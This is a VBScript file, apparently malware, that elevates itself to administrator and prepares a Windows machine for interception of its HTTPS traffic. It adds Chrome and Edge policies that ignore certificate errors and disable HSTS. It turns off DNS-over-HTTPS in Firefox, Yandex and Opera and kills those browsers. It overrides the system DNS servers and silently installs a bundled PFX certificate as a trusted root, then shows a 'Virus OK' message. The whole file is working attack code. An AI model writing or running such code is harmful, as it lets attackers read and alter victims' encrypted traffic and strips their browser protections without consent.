Option Explicit

' Hello Moto

Dim xdata
xdata = Array("00","01")

Const PrimaryDNSServer = "1.1.1.1"
Const SecondaryDNSServer = "8.8.8.8"

If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
End If

Sub MainScriptLogic()

    CertWorks

	Chrome

	FireFox

    Edge

    Dns

    Yandex

    Opera

    MsgBox "Virus OK"
End Sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End Sub



Sub Chrome
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	
	objShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableAutoDOH", 0, "REG_DWORD"

	Dim chromeKeyPath
	chromeKeyPath = "HKEY_LOCAL_MACHINE\Software\Policies\Google\Chrome"
	objShell.RegWrite chromeKeyPath & "\CommandLineFlag", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
	objShell.RegWrite chromeKeyPath & "\DnsOverHttps", "off", "REG_SZ"

    Const HKEY_LOCAL_MACHINE = &H80000002
    dim strKeyPath
    dim strValueName
    dim dwValue
    strKeyPath = "SOFTWARE\Policies\Google\Chrome"
    strValueName = "IgnoreCertificateErrors"
    dwValue = 1
    dim objRegistry
    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
    objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue	
End Sub

Sub Firefox()
    Dim objFSO, objShell, userProfilePath, profilePath, userJSPath, objFile

    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objShell = CreateObject("WScript.Shell")

    userProfilePath = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
    profilePath = userProfilePath & "\AppData\Roaming\Mozilla\Firefox\Profiles\"

    If objFSO.FolderExists(profilePath) Then
        Dim profileFolder
        Set profileFolder = objFSO.GetFolder(profilePath)

        userJSPath = profileFolder.Path & "\user.js"

        If Not objFSO.FileExists(userJSPath) Then
            Set objFile = objFSO.CreateTextFile(userJSPath)
            objFile.Close
        End If

        Set objFile = objFSO.OpenTextFile(userJSPath, 8, True)
        objFile.WriteLine "user_pref(""network.trr.mode"", 5);"
        objFile.Close
    End If

    Set objFSO = Nothing
    Set objShell = Nothing

    FireFox2
End Sub





Sub FireFox2
    Const HKEY_LOCAL_MACHINE = &H80000002

    Dim paths, values, names
    paths = Array("SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS", "SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS")
    values = Array(0, 1)
    names = Array("Enabled", "Locked")

    Dim objShell
    Set objShell = CreateObject("WScript.Shell")

    Dim i, regPath, regValue, regName, regKey
    For i = 0 To UBound(paths)
        regPath = paths(i)
        regValue = values(i)
        regName = names(i)

        On Error Resume Next
        Set regKey = objShell.RegRead("HKLM\" & regPath & "\" & regName)
        If Err.Number <> 0 Then
            Set regKey = objShell.RegCreateKeyEx(HKEY_LOCAL_MACHINE, regPath, 0, "REG_DWORD")
        End If
        On Error Goto 0
        
        objShell.RegWrite "HKLM\" & regPath & "\" & regName, regValue, "REG_DWORD"
    Next

    Set objShell = Nothing
End Sub





Sub Edge
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    
    ' Disable DNS over HTTPS (DoH) in the system registry
    objShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableAutoDOH", 0, "REG_DWORD"
    
    ' Configure Edge policies
    Const HKEY_LOCAL_MACHINE = &H80000002
    Dim edgeKeyPath
    edgeKeyPath = "SOFTWARE\Policies\Microsoft\Edge"
    objShell.RegWrite "HKEY_LOCAL_MACHINE\" & edgeKeyPath & "\CommandLine", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
    objShell.RegWrite "HKEY_LOCAL_MACHINE\" & edgeKeyPath & "\DnsOverHttps", "off", "REG_SZ"

    ' Create and set registry key for ignoring certificate errors
    Dim strKeyPath
    Dim strValueName
    Dim dwValue
    strKeyPath = "SOFTWARE\Policies\Microsoft\Edge"
    strValueName = "IgnoreCertificateErrors"
    dwValue = 1
    Dim objRegistry
    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
    objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue
End Sub



Sub Yandex
    Dim objShell, SettingsFilePath, objFSO, objFile, strContents
    Dim possiblePaths, i
    Set objShell = CreateObject("WScript.Shell")

    possiblePaths = Array( _
        GetYandexInstallationPathFromAppData() & "\Local State")

    For i = LBound(possiblePaths) To UBound(possiblePaths)
        SettingsFilePath = possiblePaths(i)
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        DisableDoHInYandex objFSO, SettingsFilePath
    Next
End Sub

Function DisableDoHInYandex(objFSO, FilePath)
    If Not objFSO.FileExists(FilePath) Then
        Exit Function
    End If

    Dim processes
    processes = Array("service_update.exe", "browser.exe")
    KillProcesses processes
    
    Dim jsonContent, jsonFile
    Set jsonFile = objFSO.OpenTextFile(FilePath, 1)
    jsonContent = jsonFile.ReadAll
    jsonFile.Close
    
    Dim regexPattern
    regexPattern = """dns_over_https""\s*:\s*\{[^}]*""mode""\s*:\s*""([^""]+)"""
    
    Dim regex
    Set regex = New RegExp
    regex.Pattern = regexPattern
    regex.IgnoreCase = True
    regex.Global = True
    
    If regex.Test(jsonContent) Then
        jsonContent = regex.Replace(jsonContent, """dns_over_https"":{""mode"":""off""")
        
        Set jsonFile = objFSO.OpenTextFile(FilePath, 2)
        jsonFile.Write jsonContent
        jsonFile.Close
        
        DisableDoHInYandex = "DNS over HTTPS mode set to 'off' in file: " & FilePath
    End If
End Function

Function GetYandexInstallationPathFromAppData()
    Dim appDataPath, operaInstallationPath
    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LOCALAPPDATA%")
    operaInstallationPath = appDataPath & "\Yandex\YandexBrowser\User Data"
    GetYandexInstallationPathFromAppData = operaInstallationPath 
End Function




Sub Opera
    Dim objShell, OperaSecurePreferencesFilePath, objFSO, objFile, strContents
    Dim possiblePaths, i
    Set objShell = CreateObject("WScript.Shell")

    possiblePaths = Array( _
        GetOperaInstallationPathFromAppData() & "\Local State", _
        GetOperaInstallationPathFromApplicationData() & "\Local State" _
    )

    For i = LBound(possiblePaths) To UBound(possiblePaths)
        OperaSecurePreferencesFilePath = possiblePaths(i)
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        If objFSO.FileExists(OperaSecurePreferencesFilePath) Then
            DisableDoHInOpera objFSO, OperaSecurePreferencesFilePath
        End If
    Next

    Set objShell = Nothing
End Sub

Function DisableDoHInOpera(objFSO, FilePath)
    If Not objFSO.FileExists(FilePath) Then
        Exit Function
    End If

    Dim processes
    processes = Array("opera_crashreporter.exe", "opera.exe")
    KillProcesses processes
    
    Dim jsonContent, jsonFile
    Set jsonFile = objFSO.OpenTextFile(FilePath, 1)
    jsonContent = jsonFile.ReadAll
    jsonFile.Close
    
    Dim regexPattern
    regexPattern = """dns_over_https""\s*:\s*\{[^}]*""mode""\s*:\s*""([^""]+)"""
    
    Dim regex
    Set regex = New RegExp
    regex.Pattern = regexPattern
    regex.IgnoreCase = True
    regex.Global = True
    
    If regex.Test(jsonContent) Then
        jsonContent = regex.Replace(jsonContent, """dns_over_https"":{""mode"":""off""")
        
        Set jsonFile = objFSO.OpenTextFile(FilePath, 2)
        jsonFile.Write jsonContent
        jsonFile.Close
        
        DisableDoHInOpera = "DNS over HTTPS mode set to 'off' in file: " & FilePath
    End If
End Function

Function GetOperaInstallationPathFromAppData()
    Dim appDataPath, operaInstallationPath
    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LOCALAPPDATA%")
    operaInstallationPath = appDataPath & "\Opera Software\Opera Stable"
    GetOperaInstallationPathFromAppData = operaInstallationPath
End Function

Function GetOperaInstallationPathFromApplicationData()
    Dim appDataPath, operaInstallationPath
    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
    operaInstallationPath = appDataPath & "\Opera Software\Opera Stable"
    GetOperaInstallationPathFromApplicationData = operaInstallationPath
End Function









Sub KillProcesses(arrProcesses)
    Dim objShell
    Dim process
    Set objShell = CreateObject("WScript.Shell")
    For Each process In arrProcesses
        Dim command
        command = "taskkill.exe /im " & process & " /f"
        objShell.Run command, 0, True
    Next
    Set objShell = Nothing
End Sub

Sub Dns
    Dim objWMIService, colAdapters, objAdapter
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration")

    For Each objAdapter In colAdapters
        If objAdapter.IPEnabled Then
            Dim arrDNSServers
            arrDNSServers = Array(PrimaryDNSServer, SecondaryDNSServer)
            objAdapter.SetDNSServerSearchOrder arrDNSServers
        End If
    Next

    Set objWMIService = Nothing
End Sub

Function CertWorks()
    dim i
    For i = LBound(xdata) To UBound(xdata)
        Dim binaryData
        binaryData = xdata(i)
        CertWork binaryData
    Next
End Function

Function TempFile
    Dim fso, tempFolder
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFolder = fso.GetSpecialFolder(2)
    TempFile = fso.BuildPath(tempFolder, fso.GetTempName() & ".pfx")
End Function

Sub CertWork(binaryData)
    Dim scriptPath
    scriptPath = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)

    Dim outputFilePath
    outputFilePath = TempFile()
    
    dim hexPairs
    dim i
    hexPairs = Split(binaryData, "-")
    Dim byteArray
    ReDim byteArray(UBound(hexPairs))
    For i = 0 To UBound(hexPairs)
        byteArray(i) = CByte("&H" & hexPairs(i))
    Next
    WriteBinary outputFilePath, byteArray

    InstallCertificate outputFilePath, "123"
    InstallCertificateRoot outputFilePath, "123"
end Sub

Sub WriteBinary(FileName, Buf)
    Dim I, aBuf, Size, bStream
    Size = UBound(Buf): ReDim aBuf(Size \ 2)
    For I = 0 To Size - 1 Step 2
    aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))
    Next
    If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))
    aBuf=Join(aBuf, "")
    Set bStream = CreateObject("ADODB.Stream")
    bStream.Type = 1: bStream.Open
    With CreateObject("ADODB.Stream")
    .Type = 2 : .Open: .WriteText aBuf
    .Position = 2: .CopyTo bStream: .Close
    End With
    bStream.SaveToFile FileName, 2: bStream.Close
    Set bStream = Nothing
End Sub

Sub InstallCertificate(certificateFilePath, password)
    Dim certutilCommand
    certutilCommand = "CERTUTIL -f -p " & password & " -importpfx """ & certificateFilePath & """"

    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run certutilCommand, 0, True
End Sub

Sub InstallCertificateRoot(pfxFilePath, password)
    Dim powerShellCommand
    powerShellCommand = "powershell -Command ""Import-PfxCertificate -FilePath '" & pfxFilePath & "' Cert:\LocalMachine\Root -Password (ConvertTo-SecureString -String '" & password & "' -AsPlainText -Force)"""

    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run powerShellCommand, 0, True
End Sub
